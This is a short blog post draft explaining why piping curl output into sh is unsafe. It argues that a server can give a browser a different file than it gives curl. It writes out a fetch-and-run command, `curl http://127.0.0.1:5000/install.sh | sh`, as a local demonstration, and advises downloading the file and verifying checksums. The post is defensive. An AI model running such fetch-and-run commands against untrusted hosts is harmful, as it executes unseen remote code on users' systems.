_PS: I still need to figure out how to replace {{ 127.0.0.1 }} with
the proper server name before I can publish this article. I guess once
blogstrap will support custom metadatas...


Why you shouldn't run arbitrary code over the network
=====================================================

Piping the output of `curl` into `sh` is a common installation
instruction given by popular software packages. It goes without saying
that it's bad practice to do this, as it creates a vunlerability to
your system, as you can never be sure what it is that you're
running here.

Some people will recommend inspecting the file before executing
it. I'm here to show you that it's not enough to inspect the file
before running this horrible command. Try this:

* Read the file located at http://127.0.0.1:5000/install.sh
* In a terminal, execute `curl http://127.0.0.1:5000/install.sh | sh`


What happened?
--------------

It's not very difficult to configure your webserver to server different content
based on the client of the users. I wrote a [very basic proof of concept][1] in
Flask.

What should I do?
-----------------

Download the file locally. Read it. Run it maybe. If you really want
to automate this, play with checksums and verify integrity before
running anything.
